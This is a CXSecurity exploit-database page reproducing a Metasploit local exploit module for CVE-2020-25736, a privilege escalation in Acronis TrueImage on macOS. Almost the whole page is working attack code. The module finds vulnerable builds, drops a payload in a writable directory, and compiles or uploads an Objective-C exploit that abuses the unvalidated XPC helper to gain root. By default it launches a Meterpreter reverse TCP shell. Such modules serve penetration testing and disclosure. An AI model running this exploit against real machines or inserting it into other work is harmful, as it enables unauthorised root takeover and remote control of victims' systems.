---
title: Acronis TrueImage XPC Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2022120029
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-17
fetch_date: 2025-10-04T01:43:59.378261
---

# Acronis TrueImage XPC Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Acronis TrueImage XPC Privilege Escalation** **2022.12.16**  Credit:  **[Csaba Fitzl](https://cxsecurity.com/author/Csaba%2BFitzl/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2020-25736](https://cxsecurity.com/cveshow/CVE-2020-25736/ "Click to see CVE-2020-25736")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = ExcellentRanking
include Msf::Post::File
include Msf::Post::Common
include Msf::Post::Process
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Acronis TrueImage XPC Privilege Escalation',
'Description' => %q{
Acronis TrueImage versions 2019 update 1 through 2021 update 1
are vulnerable to privilege escalation. The `com.acronis.trueimagehelper`
helper tool does not perform any validation on connecting clients,
which gives arbitrary clients the ability to execute functions provided
by the helper tool with `root` privileges.
},
'License' => MSF\_LICENSE,
'Author' => [
'Csaba Fitzl', # @theevilbit - Vulnerability Discovery
'Shelby Pace' # Metasploit Module and Objective-c code
],
'Platform' => [ 'osx' ],
'Arch' => [ ARCH\_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'References' => [
[ 'CVE', '2020-25736' ],
[ 'URL', 'https://kb.acronis.com/content/68061' ],
[ 'URL', 'https://attackerkb.com/topics/a1Yrvagxt5/cve-2020-25736' ]
],
'DefaultOptions' => {
'PAYLOAD' => 'osx/x64/meterpreter/reverse\_tcp',
'WfsDelay' => 15
},
'DisclosureDate' => '2020-11-11',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [ CRASH\_SAFE ],
'Reliability' => [ REPEATABLE\_SESSION ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS ]
}
)
)
register\_options([
OptString.new('WRITABLE\_DIR', [ true, 'Writable directory to write the payload to', '/tmp' ]),
OptString.new('SHELL', [ true, 'Shell to use for executing payload', '/bin/zsh' ]),
OptEnum.new('COMPILE', [ true, 'Compile exploit on target', 'Auto', [ 'Auto', 'True', 'False' ] ])
])
end
def tmp\_dir
datastore['WRITABLE\_DIR'].to\_s
end
def sys\_shell
datastore['SHELL'].to\_s
end
def compile
datastore['COMPILE']
end
def compile\_on\_target?
return false if compile == 'False'
if compile == 'Auto'
ret = cmd\_exec('xcode-select -p')
return false if ret.include?('error: unable')
end
true
end
def exp\_file\_name
@exp\_file\_name ||= Rex::Text.rand\_text\_alpha(5..10)
end
def check
helper\_location = '/Library/PrivilegedHelperTools'
helper\_svc\_names = [ 'com.acronis.trueimagehelper', 'com.acronis.helpertool' ]
plist = '/Applications/Acronis True Image.app/Contents/Info.plist'
unless helper\_svc\_names.any? { |svc\_name| file?("#{helper\_location}/#{svc\_name}") }
return CheckCode::Safe
end
return CheckCode::Detected('Service found, but cannot determine version via plist') unless file?(plist)
plutil\_cmd = "plutil -extract CFBundleVersion raw \'#{plist}\'"
build\_no = cmd\_exec(plutil\_cmd)
return CheckCode::Detected('Could not retrieve build number from plist') if build\_no.blank?
build\_no = build\_no.to\_i
vprint\_status("Found build #{build\_no}")
return CheckCode::Appears('Vulnerable build found') if build\_no > 14170 && build\_no < 33610
CheckCode::Safe('Acronis version found is not vulnerable')
end
def exploit
payload\_name = Rex::Text.rand\_text\_alpha(7)
@payload\_path = "#{tmp\_dir}/#{payload\_name}"
print\_status("Attempting to write payload at #{@payload\_path}")
unless upload\_and\_chmodx(@payload\_path, generate\_payload\_exe)
fail\_with(Failure::BadConfig, 'Failed to write payload. Consider changing WRITABLE\_DIR option.')
end
vprint\_good("Successfully wrote payload at #{@payload\_path}")
@pid = get\_valid\_pid
exp\_bin\_path = "#{tmp\_dir}/#{exp\_file\_name}"
if compile\_on\_target?
exp\_src = "#{exp\_file\_name}.m"
exp\_path = "#{tmp\_dir}/#{exp\_src}"
compile\_cmd = "gcc -framework Foundation #{exp\_path} -o #{exp\_bin\_path}"
unless write\_file(exp\_path, objective\_c\_code)
fail\_with(Failure::BadConfig, 'Failed to write Objective-C exploit to disk. WRITABLE\_DIR may need to be changed')
end
register\_files\_for\_cleanup(@payload\_path, exp\_path, exp\_bin\_path)
ret = cmd\_exec(compile\_cmd)
fail\_with(Failure::UnexpectedReply, "Failed to compile #{exp\_src}") unless ret.blank?
print\_status("Successfully compiled #{exp\_src}...Now executing payload")
else
print\_status("Using pre-compiled exploit #{exp\_bin\_path}")
compiled\_exploit = compiled\_exp
unless upload\_and\_chmodx(exp\_bin\_path, compiled\_exploit)
fail\_with(Failure::BadConfig, 'Failed to write compiled exploit. Consider changing WRITABLE\_DIR option.')
end
register\_files\_for\_cleanup(exp\_bin\_path, @payload\_path)
end
cmd\_exec(exp\_bin\_path)
end
def objective\_c\_code
file\_contents = exploit\_data('CVE-2020-25736', 'acronis-exp.erb')
ERB.new(file\_contents).result(binding)
rescue Errno::ENOENT
fail\_with(Failure::NotFound, 'ERB payload file not found')
end
def compiled\_exp
compiled = exploit\_data('CVE-2020-25736', 'acronis-exp.macho')
compiled.gsub!('/tmp/payload', @payload\_path)
compiled.gsub!('/bin/zsh', sys\_shell)
compiled.gsub!("\xEF\xBE\xAD\xDE".force\_encoding('ASCII-8BIT'), [@pid.to\_i].pack('V'))
compiled
end
def get\_valid\_pid
procs = get\_processes
return '1' if procs.empty?
len = procs.length
rand\_proc = procs[rand(1...len)]
return '1' if rand\_proc['pid'].to\_s.blank?
rand\_proc['pid'].to\_s
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120029)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \...